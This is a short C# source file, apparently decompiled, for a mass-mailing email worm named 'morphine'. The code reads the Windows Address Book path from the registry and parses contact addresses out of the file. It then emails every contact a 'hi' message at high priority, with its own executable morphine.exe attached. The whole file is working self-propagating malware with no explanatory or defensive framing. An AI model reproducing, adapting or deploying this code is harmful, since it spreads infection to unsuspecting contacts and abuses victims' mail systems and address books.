using System;
using System.IO;
using System.Text;
using System.Web.Mail;
using Microsoft.Win32;

internal class morphine
{
	public static void main()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\WAB\\WAB4\\Wab File Name");
		if (registryKey == null)
		{
			return;
		}
		string value = (string)registryKey.GetValue("");
		if (value == null)
		{
			return;
		}
		registryKey.Close();
		FileStream fileStream = new FileStream(value, FileMode.Open, FileAccess.Read);
		int num = Convert.ToInt32(fileStream.Length);
		byte[] array = new byte[num];
		fileStream.Read(array, 0, num);
		fileStream.Close();
		int num2 = BitConverter.ToInt32(array, 100);
		if (num2 != 0)
		{
			int num3 = BitConverter.ToInt32(array, 96);
			do
			{
				string @string = Encoding.Unicode.GetString(array, num3, 68);
				int num4 = @string.IndexOf('\0');
				@string = @string.Remove(num4, 34 - num4);
				MailMessage val = new MailMessage();
				val.set_Subject("hi");
				val.set_To(@string);
				val.set_Body("hi");
				val.set_BodyFormat((MailFormat)0);
				val.set_Priority((MailPriority)2);
				MailAttachment value2 = new MailAttachment(Directory.GetCurrentDirectory() + "\\morphine.exe", (MailEncoding)1);
				val.get_Attachments().Add(value2);
				SmtpMail.Send(val);
				num3 += 68;
				num2--;
			}
			while (num2 > 0);
		}
	}
}
